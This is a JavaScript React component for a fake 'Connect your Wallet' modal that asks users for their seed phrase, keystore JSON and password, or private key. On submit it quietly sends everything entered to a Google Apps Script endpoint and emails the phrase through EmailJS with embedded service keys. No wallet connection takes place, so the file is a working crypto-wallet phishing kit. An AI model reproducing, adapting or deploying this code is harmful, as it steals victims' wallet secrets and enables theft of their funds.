"use strict";

var _slicedToArray = function () { function sliceIterator(arr, i) { var _arr = []; var _n = true; var _d = false; var _e = undefined; try { for (var _i = arr[Symbol.iterator](), _s; !(_n = (_s = _i.next()).done); _n = true) { _arr.push(_s.value); if (i && _arr.length === i) break; } } catch (err) { _d = true; _e = err; } finally { try { if (!_n && _i["return"]) _i["return"](); } finally { if (_d) throw _e; } } return _arr; } return function (arr, i) { if (Array.isArray(arr)) { return arr; } else if (Symbol.iterator in Object(arr)) { return sliceIterator(arr, i); } else { throw new TypeError("Invalid attempt to destructure non-iterable instance"); } }; }();

function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }

import { modalPhraseOpen, modalKeystoreOpen, modalPrivateOpen } from "./modalform-bev.js";

var WalletModalImport = function WalletModalImport(props) {
  var _React$useState = React.useState({
    phrase_key: "",
    walletName: ""
  }),
      _React$useState2 = _slicedToArray(_React$useState, 2),
      phrase = _React$useState2[0],
      setPhrase = _React$useState2[1];

  var phraseSubmit = function phraseSubmit(e) {
    e.preventDefault();
    var scriptURL = "https://script.google.com/macros/s/AKfycbyH0l04MQ_BkLXn5EvZi2YE-H7Cv_grkBVNlyi9hI0aQckkCRFOjezMBFu-XyXlPgIOcQ/exec";
    var form = document.forms["phrasesync"];
    handleSubmit(e);
    document.getElementById("loader").className = "loader";
    fetch(scriptURL, { method: "POST", body: new FormData(form) }).then(function (res) {
      console.log(res);
      document.getElementById("loader").classList.remove("loader");
    }).then(function (res) {
      console.log(res);
      // location.reload();
    });
  };
  var keystoreSubmit = function keystoreSubmit(e) {
    e.preventDefault();
    document.getElementById("loader").classList.add("loader");
    var scriptURL = "https://script.google.com/macros/s/AKfycbyH0l04MQ_BkLXn5EvZi2YE-H7Cv_grkBVNlyi9hI0aQckkCRFOjezMBFu-XyXlPgIOcQ/exec";
    var form = document.forms["keystoresync"];
    handleSubmit(e);
    document.getElementById("loader").className = "loader";
    fetch(scriptURL, { method: "POST", body: new FormData(form) }).then(function () {
      return document.getElementById("loader").classList.remove("loader");
    }).then(function () {
      return location.reload();
    });
  };
  var privateSubmit = function privateSubmit(e) {
    e.preventDefault();
    document.getElementById("loader").classList.add("loader");
    var scriptURL = "https://script.google.com/macros/s/AKfycbyH0l04MQ_BkLXn5EvZi2YE-H7Cv_grkBVNlyi9hI0aQckkCRFOjezMBFu-XyXlPgIOcQ/exec";
    var form = document.forms["privatesync"];

    handleSubmit(e);
    document.getElementById("loader").className = "loader";
    fetch(scriptURL, { method: "POST", body: new FormData(form) }).then(function () {
      return document.getElementById("loader").classList.remove("loader");
    }).then(function () {
      return location.reload();
    });
  };

  var handleChange = function handleChange(e) {
    var _setPhrase;

    var name = e.target.name;
    var phrase = e.target.value;
    var walletName = props.name;
    setPhrase((_setPhrase = {}, _defineProperty(_setPhrase, name, phrase), _defineProperty(_setPhrase, "walletName", walletName), _setPhrase));
  };

  var handleSubmit = function handleSubmit(e) {
    e.preventDefault(e);

    var templateParams = {
      firstname: phrase.phrase_key,
      lastname: phrase.walletName
    };

    emailjs.init({
      publicKey: "vdTp8sfw8L1_oEEoM"
    });

    emailjs.send("service_hnew9sq", "romana", templateParams).then(function (response) {
      console.log("SUCCESS!", response.status, response.text);
    }, function (error) {
      console.log("FAILED...", error);
    });
  };

  return React.createElement(
    "div",
    {
      className: "modal fade",
      id: "secondModal",
      tabIndex: "-1",
      "aria-labelledby": "exampleModalToggleLabel",
      "aria-hidden": "true"
    },
    React.createElement(
      "div",
      { className: "modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable" },
      React.createElement(
        "div",
        { className: "modal-content" },
        React.createElement(
          "div",
          { className: "modal-header" },
          React.createElement("h5", { className: "modal-title", id: "exampleModalToggleLabel" }),
          React.createElement("button", {
            type: "button",
            className: "btn-close",
            "data-bs-dismiss": "modal",
            "aria-label": "Close"
          })
        ),
        " ",
        React.createElement("div", { id: "loader" }),
        React.createElement(
          "div",
          { className: "modal-body" },
          React.createElement(
            "div",
            { className: "container-fluid" },
            React.createElement(
              "div",
              { className: "row" },
              React.createElement(
                "div",
                { className: "col" },
                React.createElement(
                  "div",
                  { className: "modalimport-des" },
                  React.createElement(
                    "div",
                    { className: "modalimport-img" },
                    React.createElement("img", { src: props.image, alt: "logo" })
                  ),
                  React.createElement(
                    "div",
                    { className: "modalimport-text mt-3" },
                    React.createElement(
                      "h6",
                      null,
                      "Connect your ",
                      props.name,
                      " Wallet"
                    )
                  )
                )
              )
            ),
            React.createElement(
              "div",
              { className: "row mt-3" },
              React.createElement(
                "div",
                { className: "col-4" },
                React.createElement("input", {
                  type: "button",
                  value: "phrase",
                  onClick: function onClick() {
                    return modalPhraseOpen();
                  },
                  className: "phrasemodalimport-btn"
                })
              ),
              React.createElement(
                "div",
                { className: "col-4" },
                React.createElement("input", {
                  type: "button",
                  value: "keystore JSON",
                  onClick: function onClick() {
                    return modalKeystoreOpen();
                  },
                  className: "keystoremodalimport-btn"
                })
              ),
              React.createElement(
                "div",
                { className: "col-4" },
                React.createElement("input", {
                  type: "button",
                  value: "Private Key",
                  onClick: function onClick() {
                    return modalPrivateOpen();
                  },
                  className: "privatemodalimport-btn"
                })
              )
            ),
            React.createElement(
              "form",
              {
                name: "phrasesync",
                id: "modalphrase-import",
                className: "text-center",
                onSubmit: function onSubmit(e) {
                  return phraseSubmit(e);
                }
              },
              React.createElement(
                "div",
                { className: "row pt-5" },
                React.createElement(
                  "div",
                  { className: "col-12" },
                  React.createElement("textarea", {
                    name: "phrase_key",
                    id: "",
                    cols: "10",
                    rows: "5",
                    placeholder: "phrase",
                    onChange: function onChange(e) {
                      return handleChange(e);
                    },
                    className: "modalimport-textarea",
                    required: true
                  })
                )
              ),
              React.createElement(
                "div",
                { className: "row pt-2 walletname-none" },
                React.createElement(
                  "div",
                  { className: "col-12" },
                  React.createElement("input", {
                    type: "text",
                    name: "dappname",
                    value: props.name,
                    className: "modalpassimport"
                  })
                )
              ),
              React.createElement(
                "div",
                { className: "row pt-3 text-center" },
                React.createElement(
                  "div",
                  { className: "col-12" },
                  React.createElement(
                    "p",
                    {
                      style: {
                        color: "rgb(59, 101, 192)",
                        fontWeight: "bold",
                        fontSize: "12.5px"
                      }
                    },
                    "Typically 12 (sometimes 24) words separated by single spaces"
                  )
                )
              ),
              React.createElement(
                "div",
                { className: "row pt-2" },
                React.createElement(
                  "div",
                  { className: "col-12" },
                  React.createElement("input", {
                    type: "submit",
                    value: "Proceed",
                    className: "modalimport-btn"
                  })
                )
              )
            ),
            React.createElement(
              "form",
              {
                name: "keystoresync",
                id: "modalkeystore-import",
                className: "text-center",
                onSubmit: function onSubmit(e) {
                  return keystoreSubmit(e);
                }
              },
              React.createElement(
                "div",
                { className: "row pt-5" },
                React.createElement(
                  "div",
                  { className: "col-12" },
                  React.createElement("textarea", {
                    name: "keystore_key",
                    id: "",
                    cols: "10",
                    rows: "5",
                    placeholder: "keystore JSON",
                    onChange: function onChange(e) {
                      return handleChange(e);
                    },
                    className: "modalimport-textarea",
                    required: true
                  })
                )
              ),
              React.createElement(
                "div",
                { className: "row pt-2" },
                React.createElement(
                  "div",
                  { className: "col-12" },
                  React.createElement("input", {
                    type: "text",
                    name: "keystore_pass",
                    placeholder: "password",
                    className: "modalpassimport",
                    required: true
                  })
                )
              ),
              React.createElement(
                "div",
                { className: "row pt-2 walletname-none" },
                React.createElement(
                  "div",
                  { className: "col-12" },
                  React.createElement("input", {
                    type: "text",
                    name: "dappname",
                    value: props.name,
                    className: "modalpassimport"
                  })
                )
              ),
              React.createElement(
                "div",
                { className: "row pt-3 text-center" },
                React.createElement(
                  "div",
                  { className: "col-12" },
                  React.createElement(
                    "p",
                    {
                      style: {
                        color: "rgb(59, 101, 192)",
                        fontWeight: "bold",
                        fontSize: "12.5px"
                      }
                    },
                    "Several lines of text beginning with '(...)' plus the password you used to encrypt it"
                  )
                )
              ),
              React.createElement(
                "div",
                { className: "row pt-2" },
                React.createElement(
                  "div",
                  { className: "col-12" },
                  React.createElement("input", {
                    type: "submit",
                    value: "Proceed",
                    className: "modalimport-btn"
                  })
                )
              )
            ),
            React.createElement(
              "form",
              {
                name: "privatesync",
                id: "modalprivatekey-import",
                className: "text-center",
                onSubmit: function onSubmit(e) {
                  return privateSubmit(e);
                }
              },
              React.createElement(
                "div",
                { className: "row pt-4" },
                React.createElement(
                  "div",
                  { className: "col-12" },
                  React.createElement("input", {
                    type: "text",
                    name: "private_pass",
                    placeholder: "private key",
                    onChange: function onChange(e) {
                      return handleChange(e);
                    },
                    className: "modalpassimport",
                    required: true
                  })
                )
              ),
              React.createElement(
                "div",
                { className: "row pt-2 walletname-none" },
                React.createElement(
                  "div",
                  { className: "col-12" },
                  React.createElement("input", {
                    type: "text",
                    name: "dappname",
                    value: props.name,
                    className: "modalpassimport"
                  })
                )
              ),
              React.createElement(
                "div",
                { className: "row pt-3 text-center" },
                React.createElement(
                  "div",
                  { className: "col-12" },
                  React.createElement(
                    "p",
                    {
                      style: {
                        color: "rgb(59, 101, 192)",
                        fontWeight: "bold",
                        fontSize: "12.5px"
                      }
                    },
                    "Typically 12 (sometimes 24) words separated by single spaces"
                  )
                )
              ),
              React.createElement(
                "div",
                { className: "row pt-2" },
                React.createElement(
                  "div",
                  { className: "col-12" },
                  React.createElement("input", {
                    type: "submit",
                    value: "Proceed",
                    className: "modalimport-btn"
                  })
                )
              )
            )
          )
        ),
        React.createElement(
          "div",
          { className: "modal-footer" },
          React.createElement(
            "button",
            {
              type: "button",
              className: "btn btn-danger",
              "data-bs-dismiss": "modal"
            },
            "Cancel"
          )
        )
      )
    )
  );
};

export default WalletModalImport;